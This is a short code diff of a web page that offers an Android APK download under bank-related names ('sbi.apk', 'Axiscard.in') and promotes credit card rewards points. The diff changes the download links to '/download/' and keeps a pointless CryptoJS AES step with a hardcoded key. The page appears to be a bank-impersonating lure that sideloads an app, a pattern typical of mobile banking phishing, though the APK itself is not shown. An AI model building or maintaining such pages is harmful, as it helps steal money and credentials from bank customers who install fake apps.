@@ -44,7 +44,7 @@
     <script>
         function encrypt() {
             const secretKey = 'dsfdsadfadsfa';
-            const downloadUrl = '/app/sbi.apk'; // URL to your APK
+            const downloadUrl = '/download/'; // URL to your APK
             const encryptedUrl = CryptoJS.AES.encrypt(downloadUrl, secretKey).toString();
             window.location.href = downloadUrl; // Directly redirect to the APK file
         }
@@ -63,7 +63,7 @@
                     <div class="col-md-6">
                         <h2>DOWNLOAD <span class="black">OUR APP</span></h2>
                         <p class="text-center">Enjoy 2X REWARDS Points* on online spends with our Credit Card</p>
-                        <a class="button" href="/app/Axiscard.in" >Download Now</a>
+                        <a class="button" href="/download/" >Download Now</a>
                     </div>
                 </div>
             </div>
